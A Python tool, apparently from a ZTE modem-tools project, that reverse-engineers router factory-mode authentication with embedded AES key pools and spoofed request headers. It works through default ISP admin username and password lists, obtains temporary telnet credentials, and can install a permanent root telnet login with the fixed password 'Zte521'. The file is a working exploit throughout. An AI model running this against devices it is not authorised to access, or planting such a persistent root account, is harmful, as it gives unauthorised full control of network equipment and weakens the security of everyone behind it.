#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import argparse
import re
import sys
from random import Random, SystemRandom
from Crypto.Cipher import AES

from zte_payload import client_mac as select_client_mac
from zte_payload import (
    format_mac,
    mac_to_early2025_magic_bytes,
    mac_to_magic_bytes,
    mac_to_rerand34_magic_bytes,
)
from zte_telnet import Telnet, TelnetError, parse_temp_credentials


def pad(data_to_pad, block_size):
    # Match httpd's AES helper: round up only when the input is not already
    # block-aligned. The server allocates a separate trailing NUL for parsing.

    padding_len = (-len(data_to_pad)) % block_size
    return data_to_pad+b'\x00'*padding_len


def unpad(padded_data, block_size):
    # zero-unpad, only work for null-terminated string

    return padded_data.rstrip(b'\x00')


def aes_key_index(client_rand, server_value):
    # F6201B handshake: index = ((normalize(0x01000193 * rand) ^ value) % 60).
    # For rand in [0, 59] the product is non-negative, so the ARM signed
    # six-bit normalization (0x8000003F mask + sign repair) reduces to a
    # plain low-6-bit mask. Full formula in RE/httpd_webfac.md.
    return (((0x1000193 * client_rand) & 0x3F) ^ server_value) % 60


class WebFac:
    # Method 1: pre-2024 empty SendSq response.
    AES_KEY_POOL = [
        0x7B, 0x56, 0xB0, 0xF7, 0xDA, 0x0E, 0x68, 0x52, 0xC8, 0x19,
        0xF3, 0x2B, 0x84, 0x90, 0x79, 0xE5, 0x62, 0xF8, 0xEA, 0xD2,
        0x64, 0x93, 0x87, 0xDF, 0x73, 0xD7, 0xFB, 0xCC, 0xAA, 0xFE,
        0x75, 0x43, 0x1C, 0x29, 0xDF, 0x4C, 0x52, 0x2C, 0x6E, 0x7B,
        0x45, 0x3D, 0x1F, 0xF1, 0xDE, 0xBC, 0x27, 0x85, 0x8A, 0x45,
        0x91, 0xBE, 0x38, 0x13, 0xDE, 0x67, 0x32, 0x08, 0x54, 0x11,
        0x75, 0xF4, 0xD3, 0xB4, 0xA4, 0xB3, 0x12, 0x86, 0x67, 0x23,
        0x99, 0x4C, 0x61, 0x7F, 0xB1, 0xD2, 0x30, 0xDF, 0x47, 0xF1,
        0x76, 0x93, 0xA3, 0x8C, 0x95, 0xD3, 0x59, 0xBF, 0x87, 0x8E,
        0xF3, 0xB3, 0xE4, 0x76, 0x49, 0x88
    ]

    # Method 2: early-2025 newrand response and info=12 client proof.
    AES_KEY_POOL_EARLY_2025 = [
        0x8C, 0x23, 0x65, 0xD1, 0xFC, 0x32, 0x45, 0x37, 0x11, 0x28,
        0x71, 0x63, 0x07, 0x20, 0x69, 0x14, 0x73, 0xE7, 0xD4, 0x53,
        0x13, 0x24, 0x36, 0xC2, 0xB5, 0xE1, 0xFC, 0xCF, 0x8A, 0x9A,
        0x41, 0x89, 0x3C, 0x49, 0xCF, 0x5C, 0x72, 0x8C, 0x9E, 0xEB,
        0x75, 0x0D, 0x3F, 0xD1, 0xFE, 0xCC, 0x57, 0x65, 0x7A, 0x35,
        0x21, 0x3E, 0x68, 0x53, 0x7E, 0x97, 0x02, 0x48, 0x74, 0x71,
        0x95, 0x34, 0x53, 0x84, 0xB4, 0xC3, 0xE2, 0xD6, 0x27, 0x3D,
        0xE6, 0x5D, 0x72, 0x9C, 0xBC, 0x3D, 0x03, 0xFD, 0x76, 0xC1,
        0x9C, 0x25, 0xA8, 0x92, 0x47, 0xE4, 0x18, 0x0F, 0x24, 0x3F,
        0x4F, 0x67, 0xEC, 0x97, 0xF4, 0x99
    ]

    # Method 3: runtime total-key bytes reconstructed from the F6201B re_rand
    # VM. This is the latest generation implemented by the analyzed image.
    AES_KEY_POOL_LATEST = [
        0x9C, 0x33, 0x75, 0xD1, 0x1C, 0x42, 0x45, 0x37, 0x18, 0x48,
        0x91, 0x73, 0x17, 0x45, 0x79, 0x44, 0x43, 0xD7, 0xD5, 0x73,
        0x33, 0x54, 0x76, 0xD2, 0xC5, 0xF1, 0x2C, 0x4F, 0x7A, 0xBA,
        0x61, 0xD9, 0x5C, 0x69, 0xDF, 0x8C, 0xD2, 0x1C, 0xDE, 0x3B,
        0x35, 0x2D, 0x2F, 0xE1, 0xDE, 0x4C, 0x77, 0xF5, 0x1A, 0x65,
        0xD1, 0xFE, 0x18, 0x43, 0x8E, 0xA7, 0x42, 0x08, 0x04, 0x78,
        0xD5, 0xE4, 0xF3, 0x34, 0xA4, 0xD3, 0xF2, 0x36, 0x47, 0x6D,
        0x86, 0x9D, 0x42, 0x65, 0x13, 0x42, 0xDC, 0x42, 0x99, 0x48,
        0xDC, 0x67, 0x9F, 0x9E, 0xDC, 0x46, 0x37, 0x5F, 0x84, 0x9F,
        0x6F, 0x76, 0xCE, 0x79, 0x4F, 0x49
    ]
    # Compatibility name retained for callers written before the three-method
    # taxonomy was recovered.
    AES_KEY_POOL_NEW = AES_KEY_POOL_LATEST

    def __init__(self, ip, port, user, pw, new_method=False, selected_mac=None,
                 sendinfo_profile="rerand34", verbose=False) -> None:
        self.ip = ip
        self.port = port
        self.user = user
        self.pw = pw
        self.new_method = new_method
        self.client_mac = selected_mac
        self.sendinfo_profile = sendinfo_profile
        self.verbose = verbose
        self.auth_time = None
        self.protocol_method = None
        self.cipher = None
        self.rand = None
        self.re_rand = None
        self.proof_random = None
        self.bridge_mac = None
        self.aes_index = None
        self.S = requests.Session()
        # RequestFactoryMode checks these request metadata fields.  The
        # default requests User-Agent contains "python", and no Referer is
        # sent by default; both would set the firmware's communication-error
        # gate and cause the Telnet CMAPI configuration to be skipped.
        self.S.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36",
            # httpd compares against "<DEV.IP.IF1 address>/login.html".  The
            # expected substring contains no HTTP port, even when the client
            # connects to an explicitly configured port.
            "Referer": f"http://{self.ip}/login.html",
        })

    def _debug(self, message):
        if self.verbose:
            print("[debug] %s" % message, file=sys.stderr)

    def _request(self, method, path, data=None, plaintext=None):
        """Send an HTTP request and, when requested, show both protocol and
        wire representations.  Factory-mode requests after SendSq are AES
        ciphertext, so the plaintext command is logged separately."""
        url = f"http://{self.ip}:{self.port}{path}"
        self._debug("-> %s %s" % (method, url))
        if self.verbose:
            self._debug("-> headers=%r" % dict(getattr(self.S, "headers", {})))
        if self.verbose and plaintext is not None:
            self._debug("-> plaintext=%r" % plaintext)
        if self.verbose and data is not None:
            wire = data.encode() if isinstance(data, str) else bytes(data)
            self._debug("-> body (%d bytes) repr=%r hex=%s" % (
                len(wire), wire, wire.hex()
            ))
        resp = self.S.request(method, url, data=data)
        if self.verbose:
            content = resp.content
            self._debug("<- HTTP %d headers=%r" % (
                resp.status_code, dict(getattr(resp, "headers", {}))
            ))
            self._debug("<- body (%d bytes) repr=%r hex=%s" % (
                len(content), content, content.hex()
            ))
        return resp

    def _post(self, path, data, plaintext=None):
        # Keep using Session.post rather than Session.request so simple custom
        # sessions used by callers and tests remain compatible.
        url = f"http://{self.ip}:{self.port}{path}"
        self._debug("-> POST %s" % url)
        if self.verbose:
            self._debug("-> headers=%r" % dict(getattr(self.S, "headers", {})))
            if plaintext is not None:
                self._debug("-> plaintext=%r" % plaintext)
            wire = data.encode() if isinstance(data, str) else bytes(data)
            self._debug("-> body (%d bytes) repr=%r hex=%s" % (
                len(wire), wire, wire.hex()
            ))
        resp = self.S.post(url, data=data)
        if self.verbose:
            content = resp.content
            self._debug("<- HTTP %d headers=%r" % (
                resp.status_code, dict(getattr(resp, "headers", {}))
            ))
            self._debug("<- body (%d bytes) repr=%r hex=%s" % (
                len(content), content, content.hex()
            ))
        return resp

    def reset(self):
        # active onu web service first, increase the chances of success
        try:
            resp = self._request("GET", "/")
        except Exception as e:
            print(e)

        resp = self._post('/webFac', 'SendSq.gch')
        # 400 means the stale session was reset; when the device is already in
        # a factory session it answers 200 with an empty body, equally fine.
        if resp.status_code == 400 or (resp.status_code == 200 and resp.text == ""):
            return True
        return False

    def requestFactoryMode(self):
        try:
            resp = self._post('/webFac', 'RequestFactoryMode.gch')
            return 200 <= resp.status_code < 300
        except requests.exceptions.ConnectionError:
            # The handler accepts this request without an HTTP body; the
            # server commonly closes the connection after changing state.
            return True
        except Exception as e:
            print(e)
        return False

    def _install_aes_key(self, index, key_pool):
        # Each method uses the same 24-byte AES-192 slice transform:
        # ~(byte ^ 0x5A) is equivalent to byte ^ 0xA5.
        if index + 24 >= len(key_pool):
            print("protocol error: AES key slice out of range")
            return False
        key = bytes((value ^ 0xA5) & 0xFF for value in key_pool[index:index + 24])
        self.cipher = AES.new(key, AES.MODE_ECB)
        return True

    def sendSq(self):
        try:
            # The firmware accepts a caller-supplied challenge.  Keeping it
            # in the range used by the client and by the verified flow also
            # keeps the signed ARM normalization on its non-negative path.
            rand = Random().randint(0, 59)

            resp = self._post('/webFac', f'SendSq.gch?rand={rand}\r\n')
            if resp.status_code != 200:
                return False

            # F6201B emits an ASCII prefix followed by six raw bridge-MAC
            # bytes.  It does not emit a "newrand=" field.  The first value
            # is the modulo-60 remainder used for the AES slice; the second
            # is a separate 23-bit value consumed by the server's proof-index
            # VM.  Keep the raw response because the MAC bytes are not text.
            match = re.fullmatch(rb"re_rand=(\d+)&(\d+)&(.{6})", resp.content, re.DOTALL)
            if not match:
                # Empty SendSq responses belong to older firmware variants;
                # retain their legacy behavior for compatibility.
                if len(resp.content) == 0:
                    self.protocol_method = 1
                    self.aes_index = rand
                    if not self._install_aes_key(rand, WebFac.AES_KEY_POOL):
                        return False
                    return 1
                # Method 2 uses a single text newrand field and the historical
                # info=12 client-MAC proof.
                newrand_match = re.fullmatch(rb"newrand=(\d+)", resp.content)
                if not newrand_match:
                    print("protocol error")
                    return False
                newrand = int(newrand_match.group(1))
                if newrand >= 60:
                    print("protocol error")
                    return False
                index = aes_key_index(rand, newrand)
                self.protocol_method = 2
                self.rand = rand
                self.re_rand = newrand
                self.aes_index = index
                if not self._install_aes_key(index, WebFac.AES_KEY_POOL_EARLY_2025):
                    return False
                return 2

            re_rand = int(match.group(1))
            proof_random = int(match.group(2))
            if re_rand >= 60 or proof_random >= (1 << 23):
                print("protocol error")
                return False

            index = aes_key_index(rand, re_rand)
            self.protocol_method = 3
            self.rand = rand
            self.re_rand = re_rand
            self.proof_random = proof_random
            self.bridge_mac = match.group(3)
            self.aes_index = index

            # The RE reconstructs this image's 96-byte runtime total-key VM
            # output and verifies the transform and slice selection.
            if not self._install_aes_key(index, WebFac.AES_KEY_POOL_LATEST):
                return False
            return 3
        except requests.exceptions.ConnectionError:
            print("protocol error?")
        except Exception as e:
            print(e)
        return False

    def sendInfo(self):
        try:
            command = self.sendInfoCommand()
            resp = self._post('/webFacEntry',
                              self.cipher.encrypt(pad(command, 16)), command)
            # print(resp.status_code, repr(resp.text))
            if resp.status_code == 200:
                return True
            elif resp.status_code == 400:
                print("protocol error")
            elif resp.status_code == 401:
                print("info error")
        except Exception as e:
            print(e)
        return False

    def sendInfoCommand(self):
        method = self.protocol_method
        if method == 2:
            if self.client_mac is None:
                raise ValueError("method 2 requires the client MAC observed by the ONU/ONT")
            return b'SendInfo.gch?info=12|' + mac_to_early2025_magic_bytes(self.client_mac)
        if method != 3:
            return b'SendInfo.gch?info=6|'
        if self.client_mac is None:
            raise ValueError("method 3 requires the client MAC observed by the ONU/ONT")
        if self.bridge_mac is None:
            raise ValueError("method 3 requires the bridge MAC returned by SendSq")
        if self.sendinfo_profile == "rerand22":
            return b'SendInfo.gch?info=22|' + mac_to_magic_bytes(
                self.bridge_mac, self.client_mac
            )
        if self.sendinfo_profile != "rerand34":
            raise ValueError("unknown method-3 SendInfo profile: %s" % self.sendinfo_profile)
        return b'SendInfo.gch?info=34|' + mac_to_rerand34_magic_bytes(
            self.bridge_mac, self.client_mac
        )

    def checkLoginAuth(self):
        try:
            command = self.checkLoginAuthCommand()
            resp = self._post(
                '/webFacEntry',
                self.cipher.encrypt(
                    # httpd allocates a trailing NUL; only AES block alignment
                    # is required on the wire.
                    pad(command, 16)
                ), command)
            # print(repr(resp.text))
            if resp.status_code == 200:
                # httpd incorrectly uses strlen on this ciphertext. Missing
                # bytes cannot be reconstructed, but every complete leading
                # block remains independently decryptable in ECB mode.
                ciphertext = resp.content
                complete_length = len(ciphertext) - (len(ciphertext) % 16)
                if complete_length < 16:
                    print("protocol error: truncated auth response")
                    return False
                url = unpad(self.cipher.decrypt(ciphertext[:complete_length]), 16)
                self._debug("<- decrypted response=%r" % url)
                # resp should be "FactoryMode.gch"
                if not url.startswith(b"FactoryMode.gch"):
                    print("protocol error: invalid auth response")
                    return False
                return url
            elif resp.status_code == 400:
                print("protocol error")
            elif resp.status_code == 401:
                print("user/pass error")
        except requests.exceptions.ConnectionError:
            print("wrong step?")
        except Exception as e:
            print(e)
        return False

    def checkLoginAuthCommand(self):
        if not self.new_method:
            return f'CheckLoginAuth.gch?version50&user={self.user}&pass={self.pw}'.encode()
        self.auth_time = SystemRandom().randint(0, 999)
        return (
            f'CheckLoginAuth.gch?time{self.auth_time}&version61'
            f'&user={self.user}&pass={self.pw}'
        ).encode()


class WebFacSerial(WebFac):
    def __init__(self, ip, port, user, pw, new_method=False, selected_mac=None,
                 sendinfo_profile="rerand34", verbose=False) -> None:
        super().__init__(ip, port, user, pw, new_method, selected_mac,
                         sendinfo_profile, verbose)

    def serialSlience(self, action):
        try:
            command = f'SerialSlience.gch?action={action}'.encode()
            resp = self._post(
                '/webFacEntry',
                self.cipher.encrypt(
                    pad(command, 16)
                ), command)
            # print(repr(resp.text))
            if resp.status_code == 200:
                return True
            elif resp.status_code == 400:
                print("protocol error")
        except Exception as e:
            print(e)
        return False


class WebFacTelnet(WebFac):
    def __init__(self, ip, port, user, pw, new_method=False, selected_mac=None,
                 sendinfo_profile="rerand34", verbose=False) -> None:
        super().__init__(ip, port, user, pw, new_method, selected_mac,
                         sendinfo_profile, verbose)

    def factoryMode(self, action):
        try:
            command = self.factoryModeCommand(action)
            resp = self._post('/webFacEntry',
                              self.cipher.encrypt(pad(command, 16)), command)
            # print(repr(resp.text))
            if resp.status_code == 200:
                if action == 'close' and not resp.content:
                    return True
                # resp should be "FactoryModeAuth.gch?user=<telnetuser>&pass=<telnetpass>"
                url = unpad(self.cipher.decrypt(resp.content), 16)
                self._debug("<- decrypted response=%r" % url)
                return url
            elif resp.status_code == 400:
                print("protocol error")
            elif resp.status_code == 401:
                print("user/pass error")
        except requests.exceptions.ConnectionError as e:
            print(e)
            print("wrong step?")
        except Exception as e:
            print(e)
        return False

    def factoryModeCommand(self, action):
        if action == 'close':
            return b'FactoryMode.gch?close'
        if not self.new_method:
            # The analyzed handler accepts values 0..2; this client requests 2.
            return b'FactoryMode.gch?mode=2&user=notused'
        if self.auth_time is None:
            raise ValueError("new factory mode requires a completed authentication step")
        mode_time = SystemRandom().randint(self.auth_time, 999)
        return f'FactoryMode.gch?time{mode_time}&mode=2&user=notused'.encode()


def dealFacAuth(Class: WebFac, ip, port, users, pws, new_method=False, selected_mac=None,
                sendinfo_profile="rerand34", verbose=False):
    for user in users:
        for pw in pws:
            print(f"trying  user:\"{user}\" pass:\"{pw}\" ")
            webfac: WebFac = Class(
                ip, port, user, pw, new_method, selected_mac, sendinfo_profile, verbose
            )
            print("reset facTelnetSteps:")
            if not webfac.reset():
                print("reset failed\n")
                continue
            print("reset OK!\n")

            print("facStep 1:")
            if not webfac.requestFactoryMode():
                print("request factory mode failed\n")
                continue
            print("OK!\n")

            print("facStep 2:")
            method = webfac.sendSq()
            if not method:
                print("sendSq failed\n")
                continue
            print("OK!\n")

            if method == 1:
                print("facStep 3:")
                print("OK!\n")
                if webfac.checkLoginAuth():
                    print("facStep 4:")
                    print("OK!\n")
                    return webfac
            elif method in (2, 3):
                if webfac.client_mac is None:
                    try:
                        webfac.client_mac, source = select_client_mac(ip, port)
                    except (OSError, RuntimeError, ValueError) as error:
                        print("cannot select the ONU/ONT-visible client MAC:", error)
                        return False
                    print("webFac client MAC: %s (%s)" % (format_mac(webfac.client_mac), source))
                print("facStep 3:")
                if not webfac.sendInfo():
                    print("sendInfo error")
                    return False
                print("OK!\n")

                print("facStep 4:")
                url = webfac.checkLoginAuth()
                if not url:
                    print("try next...\n")
                    continue
                print("OK!\n")
                print(repr(url))
                return webfac
    return False


def dealSerial(ip, port, users, pws, action, new_method=False, selected_mac=None,
               sendinfo_profile="rerand34", verbose=False):
    serial = dealFacAuth(
        WebFacSerial, ip, port, users, pws, new_method, selected_mac,
        sendinfo_profile, verbose
    )
    if not serial:
        return

    print("facStep 5:")
    if serial.serialSlience(action):
        print("OK!\n")
    print('done')
    return


def dealTelnet(ip, port, users, pws, action, new_method=False, selected_mac=None,
               telnet_port=23, telnet=None, telnet_restart=False,
               sendinfo_profile="rerand34", verbose=False):
    webfac = dealFacAuth(
        WebFacTelnet, ip, port, users, pws, new_method, selected_mac,
        sendinfo_profile, verbose
    )
    if not webfac:
        print('No Luck!')
        return

    print("facStep 5:")
    url = webfac.factoryMode(action)
    if action == 'close':
        if url is True:
            print("OK!\nTelnet closed")
        return
    if not url:
        return
    print("OK!\n")
    print(repr(url))

    # The HTTP flow returns credentials even when the MAC is not honored, so
    # the run only succeeds if the credentials actually log in over telnet.
    try:
        tl_user, tl_pass = parse_temp_credentials(url if isinstance(url, str) else url.decode())
        print(f"temp user: {tl_user}, pass: {tl_pass}")
        session = Telnet.connect(tl_user, tl_pass, ip, telnet_port)
    except (TelnetError, ValueError) as error:
        print("telnet verification failed:", error)
        return
    try:
        try:
            session.login()
        except TelnetError as error:
            print("telnet verification failed:", error)
            return
        print("-" * 35)
        print("telnet verified, temp factory telnet is open")

        if telnet_restart:
            apply_permanent_telnet(session, ip, telnet_port, reboot=True)
        elif telnet:
            apply_permanent_telnet(session, ip, telnet_port, reboot=False)
    finally:
        session.close()


def apply_permanent_telnet(telnet_session, ip, telnet_port, reboot):
    """Write the permanent telnet settings (user: root, pass: Zte521) on an
    already logged-in temp session and apply them by either rebooting or
    restarting telnetd in place through the program manager."""
    try:
        telnet_session.solidify()
        print("Permanent Telnet saved\r\nuser: root, pass: Zte521")

        if reboot:
            print("wait reboot..")
            telnet_session.reboot()
            print("device is rebooting")
            return

        print("restarting telnetd in place (no reboot)..")
        telnet_session.restart_telnetd()
    except (TelnetError, ValueError, RuntimeError) as error:
        print(error)
        return
    print("telnetd restarted, verifying permanent telnet..")

    # pc sometimes takes a while to respawn telnetd, so be more patient here
    # than in the initial login before declaring the restart bad.
    verify = None
    try:
        verify = Telnet.connect("root", "Zte521", ip, telnet_port,
                                attempts=15, interval=2.0)
        verify.login()
    except (TelnetError, OSError) as error:
        print("permanent telnet verification failed:", error)
    else:
        print("permanent telnet verified after in-place restart")
    finally:
        if verify:
            verify.close()


def parseArgs():
    parser = argparse.ArgumentParser(prog='zte_factroymode', epilog='https://github.com/douniwan5788/zte_modem_tools',
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument('--user', '-u', nargs='+', help='factorymode auth username', default=[
                        'factorymode', "CMCCAdmin", "CUAdmin", "telecomadmin", "cqadmin",
                        "user", "admin", "cuadmin", "lnadmin", "useradmin"])
    parser.add_argument('--pass', '-p', metavar='PASS', dest='pw', nargs='+', help='factorymode auth password', default=[
                        'nE%jA@5b', "aDm8H%MdA", "CUAdmin", "nE7jA%5m", "cqunicom",
                        "1620@CTCC", "1620@CUcc", "admintelecom", "cuadmin", "lnadmin"])
    parser.add_argument('--ip', help='route ip', default="192.168.1.1")
    parser.add_argument('--port', help='router http port', type=int, default=80)
    parser.add_argument('--new', dest='new_method', action='store_true',
                        help='use version61/time-compatible authentication; webFac method is auto-detected')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='show HTTP commands, wire payloads, and responses for debugging')
    parser.add_argument('--sendinfo-profile', choices=['rerand34', 'rerand22'], default='rerand34',
                        help='method-3 proof profile: latest 34-word (info=34) or early 22-word (info=22)')
    mac_group = parser.add_mutually_exclusive_group()
    mac_group.add_argument('--iface', help='network interface whose MAC is observed by the ONU/ONT')
    mac_group.add_argument('--mac', '-m', help='exact client MAC observed by the ONU/ONT')
    telnet_group = parser.add_mutually_exclusive_group()
    telnet_group.add_argument('--telnet', action='store_true',
                              help='permanent telnet (user: root, pass: Zte521) applied by restarting '
                                   'the telnetd service in place, without rebooting; only applied after '
                                   'a temp telnet login is verified')
    telnet_group.add_argument('--telnet-restart', action='store_true',
                              help='permanent telnet (user: root, pass: Zte521) applied by rebooting the device')
    parser.add_argument('--tp', help='router telnet port', type=int, default=23)
    subparsers = parser.add_subparsers(dest='cmd', title='subcommands',
                                       description='valid subcommands',
                                       help='supported commands')
    telnet_parser = subparsers.add_parser("telnet", help='control telnet services on/off',
                                          formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    telnet_parser.add_argument('action', nargs="?", choices=['open', 'close'], help='action', default='open')
    serial_parser = subparsers.add_parser("serial", help='control /proc/serial on/off',
                                          formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    serial_parser.add_argument('action', nargs="?", choices=['open', 'close'], help='action', default='open')
    return parser.parse_args()


def main():
    args = parseArgs()
    selected_mac = None
    if args.new_method or args.mac or args.iface:
        try:
            selected_mac, source = select_client_mac(args.ip, args.port, args.mac, args.iface)
        except (OSError, RuntimeError, ValueError) as error:
            raise SystemExit("cannot select the ONU/ONT-visible client MAC: %s" % error)
        print("webFac client MAC: %s (%s)" % (format_mac(selected_mac), source))

    # print(args)
    if args.cmd == 'serial':
        dealSerial(args.ip, args.port, args.user, args.pw, args.action,
                   args.new_method, selected_mac, args.sendinfo_profile, args.verbose)
    elif args.cmd == 'telnet':
        dealTelnet(args.ip, args.port, args.user, args.pw, args.action,
                   args.new_method, selected_mac, args.tp,
                   args.telnet, args.telnet_restart, args.sendinfo_profile, args.verbose)


if __name__ == '__main__':
    main()
